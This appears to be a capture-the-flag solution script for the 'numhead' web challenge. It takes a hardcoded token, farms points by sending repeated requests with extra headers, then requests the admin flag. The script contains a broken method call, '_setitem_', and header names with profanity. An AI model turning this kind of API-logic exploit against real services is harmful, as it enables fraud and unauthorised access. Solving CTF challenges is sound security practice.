import requests, json

url = "https://numhead.chal.imaginaryctf.org/api"
magical_token = "0nlyL33tHax0rsAll0w3d"

res = requests.post(url + '/user/new-token', headers={"authorization": magical_token})
user_id = json.loads(res.text).get('id')
print(user_id)

headers = {
	"authorization" : user_id,
	"fuck": "hack"

}

with requests.Session() as s:

	for i in range(11):
		res = s.post(url + '/user/nothing-here', headers=headers)
		headers._setitem_("fuck{}".format(i), "hack")
		print(res.text)

	res = s.get(url + '/user/points', headers=headers)
	print(res.text)
	res = s.get(url + '/admin/flag', headers=headers)
	print(res.text)
